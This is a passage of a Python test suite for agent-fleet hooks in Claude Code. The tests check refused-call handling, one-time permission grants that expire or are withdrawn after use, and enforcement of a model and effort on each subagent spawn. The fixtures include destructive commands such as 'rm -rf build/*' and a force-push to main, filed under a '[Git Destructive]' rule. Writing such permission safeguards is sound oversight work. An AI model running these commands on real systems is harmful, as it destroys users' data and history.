    def test_a_call_no_exact_rule_can_hold_opens_an_action(self):
        for command in ("git push --force \\\n  origin HEAD:main", "rm -rf build/*", "printf 'a\\tb'", "echo a\rb"):
            self.calls.unlink(missing_ok=True)
            self.refuse(agent_id="ab12cd34", command=command)
            positionals, opts = self.only()
            self.assertEqual(opts["--kind"], "action")
            self.assertEqual(positionals[3], self.expected_id("ab12cd34", command))
            self.assertEqual(opts["--manual"].split("```nu\n", 1)[1], command + "\n```")
            self.assertEqual((opts["--agent"], opts["--blocking"]), ("a2", True))
            self.assertIn("[Git Destructive]", opts["--why"])
            for absent in ("--tool", "--call", "--cause", "--root", "--agent-id"):
                self.assertNotIn(absent, opts)

    def test_another_tools_refusal_opens_an_action_with_its_input(self):
        written = {"file_path": "/x/.claude/settings.local.json", "content": "```\n{}\n```"}
        self.refuse(tool="Write", tool_input=written, agent_id="ab12cd34")
        _, opts = self.only()
        self.assertEqual(opts["--kind"], "action")
        self.assertIn("Write", opts["--title"])
        fence = "````"
        body = opts["--manual"].split(fence + "json\n", 1)[1].rsplit("\n" + fence, 1)[0]
        self.assertEqual(json.loads(body), written)

    SPAWN = {"subagent_type": "general-purpose", "description": "prod client count",
             "prompt": "Run psql against prod: SELECT count(*) FROM clients;\nreport the number"}

    def test_an_agent_spawn_refusal_opens_a_permission_for_its_exact_input(self):
        self.refuse(tool="Agent", tool_input=self.SPAWN)
        positionals, opts = self.only()
        call = json.dumps(self.SPAWN, sort_keys=True, ensure_ascii=False, separators=(",", ":"))
        self.assertEqual(positionals[3], self.expected_id("main", call))
        self.assertEqual(opts["--kind"], "permission")
        self.assertEqual((opts["--tool"], opts["--call"], opts["--cause"], opts["--root"]),
                         ("Agent", call, "[Git Destructive]", str(self.project)))
        self.assertIn("general-purpose: prod client count", opts["--title"])
        self.assertNotIn("--agent-id", opts)
        self.assertNotIn("--manual", opts)

    def test_an_agent_call_with_no_input_opens_an_action(self):
        self.refuse(tool="Agent", tool_input={})
        _, opts = self.only()
        self.assertEqual(opts["--kind"], "action")
        self.assertNotIn("--tool", opts)

    def test_a_value_that_looks_like_a_flag_stays_a_value(self):
        self.refuse(agent_id="ab12cd34", command="-rf")
        argv = json.loads(self.calls.read_text())
        self.assertIn("--call=-rf", argv)

    def test_every_fleet_of_the_session_gets_it(self):
        other = self.pad / "manager"
        other.mkdir()
        (other / "state.json").write_text(json.dumps({"role": "manager", "agents": []}))
        self.refuse()
        dirs = sorted(c[0][1] for c in self.recorded())
        self.assertEqual(dirs, sorted([str(self.fleet), str(other)]))

    def test_nothing_outside_a_fleet(self):
        r = self.hook("PermissionDenied", {**self.base("PermissionDenied"), "tool_name": "Bash",
                                           "tool_input": {"command": "ls"}, "reason": "x"})
        self.assertSilent(r)
        self.assertEqual(self.recorded(), [])

    def test_a_failing_or_missing_cli_is_logged_and_silent(self):
        self.refuse(agent_id="ab12cd34", env={"STAND_IN_FAIL": "relative root"})
        self.assertEqual(len(self.recorded()), 1)
        self.assertIn("refused: relative root", self.log())
        self.assertIn("PermissionDenied", self.log())
        self.refuse(agent_id="ab12cd34", env={"TSTACK_FLEET_CLI": str(self.tmp / "no-such-cli")})
        self.assertIn("no-such-cli", self.log())

    def test_odd_input_never_breaks_it(self):
        for extra in ({"tool_input": ["x"]}, {"tool_input": {"command": 7}}, {"tool_name": None},
                      {"agent_id": 5}, {"reason": None}, {"cwd": 3}):
            self.assertSilent(self.hook("PermissionDenied", {**self.payload("PermissionDenied", tool_name="Bash",
                                        tool_input={"command": "ls"}, reason="r"), **extra}))
        (self.fleet / "state.json").write_text('{"agents": "none"}')
        self.refuse(agent_id="ab12cd34")
        self.assertNotIn("--agent", self.recorded()[-1][1])


class GrantRemovalTest(FleetCase):
    """fleet_grant_sweep: a grant is taken back once its call ran, or once it is older than the TTL."""

    RULE = "Bash(git push --force origin HEAD:main)"

    def setUp(self):
        super().setUp()
        self.settings = self.tmp / "project" / ".claude" / "settings.local.json"
        self.settings.parent.mkdir(parents=True)
        self.write_settings({"permissions": {"allow": ["Bash(ls)", self.RULE, "Bash(üñí)"], "deny": ["Bash(rm)"]},
                             "env": {"A": "1"}})
        self.grants = self.fleet / "grants.jsonl"

    def write_settings(self, value):
        self.settings.write_text(json.dumps(value))

    def grant(self, decision="p-1a2b3c4d", rule=RULE, at="2026-01-05T09:00:00+00:00", file=None, op="grant",
              agent_id=None):
        with open(self.grants, "a") as f:
            f.write(json.dumps({"op": op, "decision": decision, "ref": "P1", "rule": rule, "agent_id": agent_id,
                                "file": str(file or self.settings), "at": at, "by": "local", "reload": "live"},
                               separators=(",", ":")) + "\n")

    def run_tool(self, command, now="2026-01-05T09:05:00+00:00", event="PostToolUse", tool="Bash", env=None,
                 agent_id=None):
        extra = {"agent_id": agent_id} if agent_id else {}
        payload = self.payload(event, tool_name=tool, tool_input={"command": command}, **extra)
        r = self.hook(event, payload, env={"FLEET_NOW": now, "TZ": "UTC", **(env or {})})
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertNotIn("failed", self.log())

    def lines(self):
        return [json.loads(line) for line in self.grants.read_text().splitlines()]

    def allow(self):
        return json.loads(self.settings.read_text())["permissions"]["allow"]

    def test_the_granted_call_takes_its_rule_back(self):
        self.grant()
        self.run_tool("git push --force origin HEAD:main")
        self.assertEqual(self.allow(), ["Bash(ls)", "Bash(üñí)"])
        text = self.settings.read_text()
        self.assertEqual(json.loads(text), {"permissions": {"allow": ["Bash(ls)", "Bash(üñí)"], "deny": ["Bash(rm)"]},
                                            "env": {"A": "1"}})
        self.assertTrue(text.endswith("}\n"))
        self.assertIn('\n  "permissions": {\n    "allow": [\n      "Bash(ls)"', text)
        self.assertIn("üñí", text)
        self.assertEqual(sorted(p.name for p in self.settings.parent.iterdir()), ["settings.local.json"])
        self.assertEqual(self.lines()[-1], {"op": "remove", "decision": "p-1a2b3c4d", "rule": self.RULE,
                                            "file": str(self.settings), "at": "2026-01-05T09:05:00+00:00",
                                            "why": "used"})

    def test_a_failed_call_counts_as_used(self):
        self.grant()
        self.run_tool("git push --force origin HEAD:main", event="PostToolUseFailure")
        self.assertNotIn(self.RULE, self.allow())
        self.assertEqual(self.lines()[-1]["why"], "used")

    def test_another_call_leaves_it_until_it_expires(self):
        self.grant()
        for command, tool in (("git push --force origin HEAD:main 2>&1", "Bash"), ("ls", "Bash"),
                              ("git push --force origin HEAD:main", "Write")):
            self.run_tool(command, tool=tool, now="2026-01-05T09:29:59+00:00")
        self.assertIn(self.RULE, self.allow())
        self.assertEqual(len(self.lines()), 1)
        self.run_tool("ls", now="2026-01-05T09:30:00+00:00")
        self.assertEqual(self.allow(), ["Bash(ls)", "Bash(üñí)"])
        self.assertEqual(self.lines()[-1]["why"], "expired")

    def test_the_age_is_thirty_minutes_whatever_the_environment_says(self):
        self.grant()
        self.run_tool("ls", now="2026-01-05T09:05:00+00:00", env={"FLEET_GRANT_TTL_MIN": "5"})
        self.assertIn(self.RULE, self.allow())

    def test_a_grant_is_used_only_by_the_caller_it_was_for(self):
        self.grant(agent_id="ab12cd34")
        self.run_tool("git push --force origin HEAD:main")
        self.run_tool("git push --force origin HEAD:main", agent_id="ee55ee55")
        self.assertIn(self.RULE, self.allow())
        self.assertEqual(len(self.lines()), 1)
        self.run_tool("git push --force origin HEAD:main", agent_id="ab12cd34")
        self.assertNotIn(self.RULE, self.allow())
        self.assertEqual(self.lines()[-1]["why"], "used")

    def test_a_main_thread_grant_is_not_used_by_a_subagent(self):
        self.grant()
        self.run_tool("git push --force origin HEAD:main", agent_id="ab12cd34")
        self.assertIn(self.RULE, self.allow())
        self.run_tool("git push --force origin HEAD:main")
        self.assertNotIn(self.RULE, self.allow())

    def test_an_agent_grant_is_taken_back_from_the_grants_file_once_the_spawn_ran(self):
        spawn = {"subagent_type": "Explore", "description": "d", "prompt": "count rows"}
        rule = "Agent(" + json.dumps(spawn, sort_keys=True, ensure_ascii=False, separators=(",", ":")) + ")"
        grants_file = self.settings.parent / "tstack-grants.json"
        grants_file.write_text(json.dumps({"permissions": {"allow": [rule]}}))
        self.grant(rule=rule, file=grants_file)
        other = {**spawn, "prompt": "count rows!"}
        for tool_input in (other, {"command": "count rows"}):
            payload = self.payload("PostToolUse", tool_name="Agent", tool_input=tool_input)
            self.assertSilent(self.hook("PostToolUse", payload, env={"FLEET_NOW": "2026-01-05T09:05:00+00:00"}))
        self.assertEqual(json.loads(grants_file.read_text())["permissions"]["allow"], [rule])
        payload = self.payload("PostToolUse", tool_name="Agent", tool_input=dict(reversed(list(spawn.items()))))
        self.assertSilent(self.hook("PostToolUse", payload, env={"FLEET_NOW": "2026-01-05T09:05:00+00:00"}))
        self.assertEqual(json.loads(grants_file.read_text())["permissions"]["allow"], [])
        self.assertEqual((self.lines()[-1]["why"], self.lines()[-1]["file"]), ("used", str(grants_file)))
        self.assertIn(self.RULE, self.allow())

    def test_a_removal_is_one_compact_line(self):
        self.grant()
        self.run_tool("git push --force origin HEAD:main")
        last = self.grants.read_text().splitlines()[-1]
        self.assertEqual(last, json.dumps(json.loads(last), separators=(",", ":"), ensure_ascii=False))

    def lock(self, age_s=0.0):
        lock = self.settings.parent / ".settings.local.json.lock"
        lock.mkdir()
        then = time.time() - age_s
        os.utime(lock, (then, then))
        return lock

    def test_a_held_settings_lock_leaves_the_grant_open(self):
        lock = self.lock()
        self.grant()
        payload = self.payload("PostToolUse", tool_name="Bash", tool_input={"command": "git push --force origin HEAD:main"})
        started = time.monotonic()
        self.assertSilent(self.hook("PostToolUse", payload, env={"FLEET_NOW": "2026-01-05T09:05:00+00:00"}))
        self.assertGreaterEqual(time.monotonic() - started, 2)
        self.assertIn("lock", self.log())
        self.assertIn(self.RULE, self.allow())
        self.assertEqual(len(self.lines()), 1)
        self.assertTrue(lock.is_dir())

    def test_a_stale_settings_lock_is_taken(self):
        lock = self.lock(age_s=11)
        self.grant()
        self.run_tool("git push --force origin HEAD:main")
        self.assertNotIn(self.RULE, self.allow())
        self.assertFalse(lock.exists())

    def test_a_removed_grant_is_not_taken_back_twice(self):
        self.grant()
        self.run_tool("git push --force origin HEAD:main")
        self.write_settings({"permissions": {"allow": [self.RULE]}})  # granted again by hand, outside the hub
        self.run_tool("git push --force origin HEAD:main", now="2026-01-05T10:00:00+00:00")
        self.assertEqual(self.allow(), [self.RULE])
        self.assertEqual([line["op"] for line in self.lines()], ["grant", "remove"])

    def test_a_second_grant_of_the_same_rule_is_its_own(self):
        self.grant()
        self.run_tool("git push --force origin HEAD:main")
        self.grant(decision="p-99999999", at="2026-01-05T09:10:00+00:00")
        self.write_settings({"permissions": {"allow": [self.RULE]}})
        self.run_tool("git push --force origin HEAD:main", now="2026-01-05T09:11:00+00:00")
        self.assertEqual(self.allow(), [])
        self.assertEqual([(line["op"], line["decision"]) for line in self.lines()],
                         [("grant", "p-1a2b3c4d"), ("remove", "p-1a2b3c4d"), ("grant", "p-99999999"),
                          ("remove", "p-99999999")])

    def test_a_missing_file_or_rule_still_closes_the_grant(self):
        self.write_settings({"permissions": {"allow": ["Bash(ls)"]}})
        self.grant()
        other = self.tmp / "gone" / ".claude" / "settings.local.json"
        self.grant(decision="p-00000002", file=other)
        self.run_tool("git push --force origin HEAD:main")
        self.assertEqual(self.allow(), ["Bash(ls)"])
        self.assertFalse(other.exists())
        self.assertEqual([line["op"] for line in self.lines()], ["grant", "grant", "remove", "remove"])

    def test_an_emptied_list_stays_and_so_does_the_file(self):
        self.write_settings({"permissions": {"allow": [self.RULE]}})
        self.grant()
        self.run_tool("git push --force origin HEAD:main")
        self.assertEqual(json.loads(self.settings.read_text()), {"permissions": {"allow": []}})

    def test_a_broken_settings_file_is_logged_and_the_grant_stays_open(self):
        self.settings.write_text("{not json")
        self.grant()
        payload = self.payload("PostToolUse", tool_name="Bash", tool_input={"command": "git push --force origin HEAD:main"})
        self.assertSilent(self.hook("PostToolUse", payload, env={"FLEET_NOW": "2026-01-05T09:05:00+00:00"}))
        self.assertIn("settings.local.json", self.log())
        self.assertEqual(self.settings.read_text(), "{not json")
        self.assertEqual(len(self.lines()), 1)

    def test_only_a_claude_settings_local_file_is_touched(self):
        elsewhere = self.tmp / "notes.json"
        elsewhere.write_text(json.dumps({"permissions": {"allow": [self.RULE]}}))
        self.grant(file=elsewhere)
        self.grant(decision="p-00000003", file="relative/.claude/settings.local.json")
        self.run_tool("git push --force origin HEAD:main", now="2026-01-05T11:00:00+00:00")
        self.assertEqual(elsewhere.read_text(), json.dumps({"permissions": {"allow": [self.RULE]}}))
        self.assertEqual(len(self.lines()), 2)

    def test_odd_lines_are_skipped_and_a_torn_one_waits(self):
        with open(self.grants, "w") as f:
            f.write("not json\n[1]\nnull\n" + json.dumps({"op": "grant", "decision": 5, "rule": self.RULE}) + "\n")
        self.grant(at="yesterday")  # an age it cannot read: expired
        with open(self.grants, "a") as f:
            f.write('{"op": "grant", "decision": "p-torn", "rule": "Bash(ls)", "fi')
        self.run_tool("ls")
        self.assertEqual(self.allow(), ["Bash(ls)", "Bash(üñí)"])
        text = self.grants.read_text()
        self.assertIn('"fi\n{"op":"remove"', text)
        self.assertEqual(json.loads(text.splitlines()[-1])["why"], "expired")

    def test_through_fleet_dir_too(self):
        self.grant()
        payload = {**self.base("PostToolUse"), "tool_name": "Bash", "tool_input": {"command": "git push --force origin HEAD:main"}}
        self.assertSilent(self.hook("PostToolUse", payload, env={"FLEET_DIR": str(self.fleet), "FLEET_WORKER": "a1"}))
        self.assertNotIn(self.RULE, self.allow())

    def test_without_grants_it_costs_next_to_nothing(self):
        module = load_hook()
        payload = self.payload("PostToolUse", tool_name="Bash", tool_input={"command": "ls"})
        hook = module.Hook("PostToolUse", payload, self.env)
        module.fleet_dirs(hook)
        started = time.perf_counter()
        for _ in range(500):
            module.fleet_grant_sweep(hook)
        per_call = (time.perf_counter() - started) * 1000 / 500
        print(f"\n  grant sweep with no grants.jsonl: {per_call * 1000:.0f} µs", end="", file=sys.stderr)
        self.assertLess(per_call, 0.1)
        self.grant(at="2026-01-05T09:00:00+00:00")
        self.grant(decision="p-2", op="remove")
        self.grant(decision="p-2")
        env = {**self.env, "FLEET_NOW": "2026-01-05T09:01:00+00:00"}
        times = []
        for _ in range(200):
            hook = module.Hook("PostToolUse", payload, env)
            started = time.perf_counter()
            module.fleet_grant_sweep(hook)
            times.append((time.perf_counter() - started) * 1000)
        print(f", with live grants not due: median {statistics.median(times):.3f} ms", end="", file=sys.stderr)
        self.assertLess(statistics.median(times), 1, times[:20])
        self.assertIn(self.RULE, self.allow())


class AgentGrantTest(HookCase):
    """fleet_agent_grant (PreToolUse, Agent): auto mode ignores Agent allow rules, so a granted spawn is let
    through by the hook, from <root>/.claude/tstack-grants.json, for its exact input alone."""

    SPAWN = {"subagent_type": "general-purpose", "description": "prod client count", "prompt": "SELECT 1;\nreport"}

    def setUp(self):
        super().setUp()
        self.project = self.tmp / "project"
        self.file = self.project / ".claude" / "tstack-grants.json"
        self.file.parent.mkdir(parents=True)
        self.env["CLAUDE_PROJECT_DIR"] = str(self.project)

    @staticmethod
    def rule(spawn):
        return "Agent(" + json.dumps(spawn, sort_keys=True, ensure_ascii=False, separators=(",", ":")) + ")"

    def spawn(self, tool_input=None, tool="Agent", **extra):
        payload = {**self.base("PreToolUse"), "tool_name": tool,
                   "tool_input": self.SPAWN if tool_input is None else tool_input, **extra}
        r = self.hook("PreToolUse", payload)
        self.assertEqual(r.returncode, 0, r.stderr)
        return r.stdout

    def test_the_granted_spawn_is_allowed(self):
        self.file.write_text(json.dumps({"permissions": {"allow": ["Agent(x)", self.rule(self.SPAWN)]}}))
        out = json.loads(self.spawn(dict(reversed(list(self.SPAWN.items())))))
        decision = out["hookSpecificOutput"]
        self.assertEqual((decision["hookEventName"], decision["permissionDecision"]), ("PreToolUse", "allow"))
        self.assertIn("once", decision["permissionDecisionReason"])
        self.assertIn(self.rule(self.SPAWN), json.loads(self.file.read_text())["permissions"]["allow"])  # the sweep takes it back

    def test_a_subagents_spawn_is_allowed_from_the_session_root_too(self):
        self.file.write_text(json.dumps({"permissions": {"allow": [self.rule(self.SPAWN)]}}))
        self.assertIn('"allow"', self.spawn(agent_id="ab12cd34", cwd=str(self.tmp)))

    def test_anything_else_says_nothing(self):
        self.file.write_text(json.dumps({"permissions": {"allow": [self.rule(self.SPAWN)]}}))
        self.assertEqual(self.spawn({**self.SPAWN, "prompt": "SELECT 2;"}), "")
        self.assertEqual(self.spawn({**self.SPAWN, "model": "opus"}), "")
        self.assertEqual(self.spawn({"command": "x"}, tool="Bash"), "")
        settings = self.file.parent / "settings.local.json"
        settings.write_text(json.dumps({"permissions": {"allow": [self.rule(self.SPAWN)]}}))
        self.file.unlink()
        self.assertEqual(self.spawn(), "")  # a rule in the settings is Claude Code's, not the hook's

    def test_a_broken_or_odd_file_says_nothing(self):
        for text in ("{not json", "[]", '{"permissions": []}', '{"permissions": {"allow": "x"}}'):
            self.file.write_text(text)
            self.assertEqual(self.spawn(), "")
        self.assertEqual(self.spawn(["x"]), "")


class SpawnEffortTest(FleetCase):
    """fleet_spawn_effort (PreToolUse, Agent): in a session that serves a fleet a spawn names its model and effort, or
    is denied with the pair to pass (the ledger's row, else MODELS.md's role). It never allows a call."""

    BRIEFED = "Read {dir}/brief.md first; your id is a1.\n\nTask: write the schema"

    def setUp(self):
        super().setUp()
        self.project = self.tmp / "project"
        (self.project / ".claude" / "agents").mkdir(parents=True)
        self.env["CLAUDE_PROJECT_DIR"] = str(self.project)
        self.ledger(agents=[
            {"id": "a1", "name": "schema", "skill": "implement", "model": "sonnet", "effort": "high"},
            {"id": "r1", "name": "r1", "skill": "research", "model": "sonnet", "effort": "medium"},
            {"id": "old", "name": "old", "skill": "research", "model": "sonnet"}])

    def spawn(self, env=None, extra=None, **tool_input):
        tool_input = {"subagent_type": "general-purpose", "description": "do it", "prompt": "go", **tool_input}
        tool_input = {k: v for k, v in tool_input.items() if v is not None}
        payload = {**self.payload("PreToolUse", tool_name="Agent", tool_input=tool_input), **(extra or {})}
        r = self.hook("PreToolUse", payload, env=env)
        self.assertEqual(r.returncode, 0, r.stderr)
        return r

    def denial(self, **tool_input):
        r = self.spawn(**tool_input)
        self.assertTrue(r.stdout, f"no decision; stderr: {r.stderr}; log: {self.log()}")
        d = json.loads(r.stdout)["hookSpecificOutput"]
        self.assertEqual((d["hookEventName"], d["permissionDecision"]), ("PreToolUse", "deny"))
        self.assertNotIn("updatedInput", d)
        return d["permissionDecisionReason"]

    def test_a_spawn_without_effort_is_denied_with_the_ledger_rows_pair(self):
        reason = self.denial(model="opus", prompt=self.BRIEFED.format(dir=self.fleet))
        self.assertIn("This Agent call names no effort. A spawn without an effort inherits this session's effort", reason)
        self.assertIn("a spawn passes both `model` and `effort`", reason)
        self.assertIn('Pass model: "sonnet", effort: "high": the pair the fleet\'s ledger records for a1.', reason)
        self.assertIn("Issue the call again with them.", reason)
        for opening in ("your id is r1.", "\n\nRead /x/brief.md first; your id is r1, go\nTask: a1 waits", 'your id is r1"'):
            with self.subTest(opening=opening):
                self.assertIn('Pass model: "sonnet", effort: "medium": the pair the fleet\'s ledger records for r1.',
                              self.denial(model="sonnet", prompt=opening))

    def test_a_worker_is_the_one_the_briefs_opening_line_names_and_no_other(self):
        self.ledger(agents=[{"id": "a1", "name": "hook", "skill": "tdd", "model": "opus", "effort": "high"},
                            {"id": "r1", "name": "docs", "skill": "research", "model": "sonnet", "effort": "medium"},
                            {"id": "advisor", "name": "advisor", "skill": "none", "model": "fable", "effort": "high"}])
        # the review's probes (2026-10-12): a worker's id or name anywhere in the call was taken for the worker spawned
        sweep = self.denial(subagent_type="Explore", description="sweep the logs",
                            prompt="Find every error in the logs. If unsure, ask the advisor before asking Luiz.")
        self.assertIn('Pass model: "sonnet", effort: "medium": the Researcher pair of MODELS.md (subagent_type Explore).', sweep)
        self.assertNotIn("fable", sweep.split("Pass ", 1)[1].split(".", 1)[0])
        review = self.denial(description="Reviewer: correctness", prompt="Review the diff. Check the docs too.")
        self.assertIn('Pass model: "opus", effort: "high": the Reviewer pair of MODELS.md (its description names the role).', review)
        for tool_input in ({"description": "r1: read the docs"}, {"description": "docs"}, {"prompt": "Where does the hook read stdin?"},
                           {"prompt": "First line.\nRead /x/brief.md first; your id is a1."}, {"prompt": "your id is a9."}):
            with self.subTest(tool_input=tool_input):
                self.assertIn("Pass effort: per MODELS.md (", self.denial(model="opus", **tool_input))

    def test_a_row_from_before_efforts_is_sent_to_fleet_brief_for_its_effort(self):
        for id in ("old", "odd"):
            self.ledger(agents=[{"id": "old", "name": "old", "skill": "research", "model": "haiku"},
                                {"id": "odd", "name": "odd", "model": "haiku", "effort": "ultra"}])
            reason = self.denial(model="haiku", prompt=f"your id is {id}.")
            self.assertIn(f'Pass model: "haiku" and the effort `{self.fleet_cli} brief {self.fleet} {id}` prints on its first '
                          f"line: the ledger's row for {id} records no effort.", reason)

    def test_a_spawn_that_names_no_worker_gets_its_roles_pair_from_models_md(self):
        for tool_input, role, pair, why in (
                ({"description": "Implementer: the parser"}, "Implementer", ("opus", "high"), "its description names the role"),
                ({"description": "a Verifier for PR 12", "subagent_type": "Explore"}, "Verifier", ("opus", "medium"),
                 "its description names the role"),
                ({"subagent_type": "Explore"}, "Researcher", ("sonnet", "medium"), "subagent_type Explore")):
            with self.subTest(tool_input=tool_input):
                self.assertIn(f'Pass model: "{pair[0]}", effort: "{pair[1]}": the {role} pair of MODELS.md ({why}).',
                              self.denial(model="opus", **tool_input))
        # two roles in the description, a role or a skill in the prompt alone, a lower-case word: the table
        for tool_input in ({"description": "Implementer and Reviewer"}, {"prompt": "You are a Reviewer; hand sweeps to a Reader."},
                           {"prompt": 'Skill: call the Skill tool with "tstack:research" and follow it.'},
                           {"description": "reviewer of the diff"}):
            with self.subTest(tool_input=tool_input):
                reason = self.denial(model="opus", **tool_input)
                self.assertIn("Pass effort: per MODELS.md (", reason)
        for pair in ("Implementer/Reviewer opus high", "Researcher sonnet medium", "Reader haiku high", "Watcher haiku low",
                     "Decider/Escalation/Advisor fable high"):
            self.assertIn(pair, reason)
        self.assertNotIn("Coordinator", reason)
        self.assertIn(f"`{self.fleet_cli} brief <dir> <id>` prints a recorded worker's pair", reason)

    def test_each_denial_is_worded_for_what_is_missing(self):
        only_model = self.denial(effort="high")
        self.assertIn("This Agent call names no model. A spawn without a model runs on its agent type's default or this "
                      "session's model, whatever the worker's role.", only_model)
        self.assertNotIn("without an effort", only_model)
        self.assertIn("This Agent call names no model and no effort. A spawn without them inherits this session's model and "
                      "its effort (low, for a coordinator), whatever the worker's role.", self.denial())
        self.assertIn("This Agent call names no effort. A spawn without an effort inherits this session's effort (low, for a "
                      "coordinator), whatever the worker's role.", self.denial(model="opus"))
        r = self.spawn(model="opus", extra={"effort": {"level": "low"}})
        self.assertIn("A spawn without an effort inherits this session's low effort, whatever the worker's role.", r.stdout)
        self.assertIn("names no effort", self.denial(model="opus", effort="  "))

    def test_a_spawn_with_both_passes(self):
        for effort in ("low", "medium", "high", "xhigh"):
            r = self.spawn(model="opus", effort=effort, prompt=self.BRIEFED.format(dir=self.fleet))
            self.assertEqual((r.stdout, r.stderr), ("", ""))

    def test_a_definition_whose_frontmatter_carries_them_passes(self):
        for kind in ("tstack:advisor", "tstack:reader", "tstack:worktree-janitor"):
            with self.subTest(kind=kind):
                self.assertEqual(self.spawn(subagent_type=kind).stdout, "")
        agents = self.project / ".claude" / "agents"
        (agents / "deep").mkdir()
        (agents / "deep" / "judge-file.md").write_text("---\nname: judge\nmodel: fable\neffort: \"high\"\n---\nJudge.\n")
        (agents / "half.md").write_text("---\nname: half\neffort: medium\n---\nNo model.\n")
        (agents / "bare.md").write_text("---\nname: bare\ndescription: nothing else\n---\n")
        (agents / "body.md").write_text("no frontmatter\nmodel: opus\neffort: high\n")
        self.assertEqual(self.spawn(subagent_type="judge").stdout, "")
        self.assertEqual(self.spawn(subagent_type="half", model="opus").stdout, "")
        self.assertIn("names no model.", self.denial(subagent_type="half"))
        self.assertIn("names no effort.", self.denial(subagent_type="bare", model="opus"))
        self.assertIn("names no model and no effort.", self.denial(subagent_type="body"))
        for kind in ("tstack:no-such-agent", "elsewhere:reader", "judge-file", "../agents/advisor", 7, ["x"]):
            with self.subTest(kind=kind):
                self.assertIn("names no model and no effort.", self.denial(subagent_type=kind))

    def test_frontmatter_is_read_past_a_bom_blank_lines_quotes_and_comments(self):
        agents = self.project / ".claude" / "agents"
        (agents / "bom.md").write_bytes(b"\xef\xbb\xbf---\nname: bom\nmodel: opus\neffort: high\n---\nbody")
        (agents / "blank.md").write_text("\n\n---\nname: blank\nmodel: opus\neffort: high\n---\n")
        (agents / "crlf.md").write_bytes(b"---\r\nname: crlf\r\nmodel: opus\r\neffort: high\r\n---\r\nbody")
        (agents / "quoted.md").write_text("---\nname: \"quoted\"\nmodel: 'opus'\neffort: \"high\"  # why\n---\n")
        (agents / "long.md").write_text("---\nname: long\ndescription: " + "x" * 20000 + "\nmodel: opus\neffort: high\n---\n")
        (agents / "block.md").write_text("---\nname: block\ndescription: |\n  model: fake\n  effort: high\nmodel: opus\n---\n")
        for kind in ("bom", "blank", "crlf", "quoted", "long"):
            with self.subTest(kind=kind):
                self.assertEqual(self.spawn(subagent_type=kind).stdout, "")
        self.assertIn("names no effort.", self.denial(subagent_type="block"))  # an indented line is the description's

    def test_a_definitions_effort_is_held_to_the_levels_as_the_calls_is(self):
        agents = self.project / ".claude" / "agents"
        (agents / "banana.md").write_text("---\nname: banana\nmodel: sonnet\neffort: banana\n---\n")
        (agents / "most.md").write_text("---\nname: most\nmodel: opus\neffort: max\n---\n")
        reason = self.denial(subagent_type="banana")
        self.assertIn('The definition of banana names effort: "banana", which is not a level (low, medium, high, xhigh, max), '
                      "and this Agent call names none.", reason)
        self.assertEqual(self.spawn(subagent_type="banana", effort="medium").stdout, "")  # the call's effort overrides it
        noted = json.loads(self.spawn(subagent_type="most").stdout)["hookSpecificOutput"]
        self.assertEqual(set(noted), {"hookEventName", "additionalContext"})
        self.assertIn("max effort", noted["additionalContext"])

    def test_another_plugins_definition_is_read_from_where_it_is_installed(self):
        install = self.tmp / "plugins" / "other" / "1.0.0"
        (install / "agents").mkdir(parents=True)
        (install / "agents" / "scout.md").write_text("---\nname: scout\nmodel: haiku\neffort: high\n---\n")
        config = self.tmp / "home" / ".claude" / "plugins"
        config.mkdir(parents=True)
        self.assertIn("names no model and no effort.", self.denial(subagent_type="other:scout"))
        (config / "installed_plugins.json").write_text(json.dumps({"version": 2, "plugins": {
            "other@market": [{"scope": "user", "installPath": str(install)}], "odd@market": "x"}}))
        self.assertEqual(self.spawn(subagent_type="other:scout").stdout, "")
        self.assertIn("names no model and no effort.", self.denial(subagent_type="other:nobody"))
        (config / "installed_plugins.json").write_text("{broken")
        self.assertIn("names no model and no effort.", self.denial(subagent_type="other:scout"))

    def test_a_fork_passes(self):
        r = self.spawn(subagent_type="fork")
        self.assertEqual((r.stdout, r.stderr), ("", ""))

    def test_a_session_that_serves_no_fleet_passes(self):
        outside = self.hook("PreToolUse", {**self.base("PreToolUse"), "tool_name": "Agent",
                                           "tool_input": {"subagent_type": "general-purpose", "prompt": "go"}})
        self.assertEqual((outside.returncode, outside.stdout, outside.stderr), (0, "", ""))
        self.register(self.fleet, session="another-session")  # a ledger this session only holds
        self.assertEqual(self.spawn().stdout, "")
        self.register(self.fleet)
        self.assertIn('"deny"', self.spawn().stdout)
        for env in ({"FLEET_WORKER": "a1", "FLEET_DIR": str(self.fleet)}, {"TSTACK_ROLE": "worker"}):
            with self.subTest(env=env):  # a worker launched as its own process runs at its launch's effort
                self.assertEqual(self.spawn(env=env).stdout, "")
        self.assertEqual(self.spawn(extra={"tool_name": "Bash"}).stdout, "")

    def test_a_fleet_named_by_fleet_dir_and_a_workers_own_spawn_are_held_to_it(self):
        (self.registry / "p.json").unlink()
        self.assertEqual(self.spawn().stdout, "")
        self.assertIn('"deny"', self.spawn(env={"FLEET_DIR": str(self.fleet)}).stdout)
        self.register(self.fleet)
        self.assertIn('"deny"', self.spawn(extra={"agent_id": "ab12cd34"}).stdout)  # a subagent of the session that serves

    def test_an_effort_the_tool_does_not_take_is_denied(self):
        reason = self.denial(model="opus", effort="ultra", description="Implementer: x")
        self.assertIn('effort: "ultra" is not a level the Agent tool takes (low, medium, high, xhigh, max).', reason)
        self.assertIn('Pass model: "opus", effort: "high": the Implementer pair of MODELS.md', reason)
        self.assertIn('effort: "High" is not a level', self.denial(model="opus", effort="High"))
        self.assertIn('effort: " high " is not a level', self.denial(model="opus", effort=" high "))

    def test_max_is_noted_without_a_decision(self):
        r = self.spawn(model="opus", effort="max")
        out = json.loads(r.stdout)["hookSpecificOutput"]
        self.assertEqual(set(out), {"hookEventName", "additionalContext"})
        self.assertIn("max effort, which no role of MODELS.md uses", out["additionalContext"])
        self.assertEqual(r.stderr, "")  # Claude never reads a hook's stderr on exit 0

    def test_the_effort_variable_in_a_fleet_sessions_environment_is_noted_on_every_spawn(self):
        forced = {"CLAUDE_CODE_EFFORT_LEVEL": "low"}
        r = self.spawn(model="opus", effort="high", env=forced)
        out = json.loads(r.stdout)["hookSpecificOutput"]
        self.assertEqual(set(out), {"hookEventName", "additionalContext"})
        self.assertIn("CLAUDE_CODE_EFFORT_LEVEL=low is set in this session's environment, and it takes precedence over the "
                      "effort an Agent call passes and over a definition's `effort:`", out["additionalContext"])
        self.assertIn("belongs in the `effortLevel` setting", out["additionalContext"])
        self.assertIn("CLAUDE_CODE_EFFORT_LEVEL=low", self.spawn(subagent_type="tstack:reader", env=forced).stdout)
        both = json.loads(self.spawn(model="opus", effort="max", env=forced).stdout)["hookSpecificOutput"]["additionalContext"]
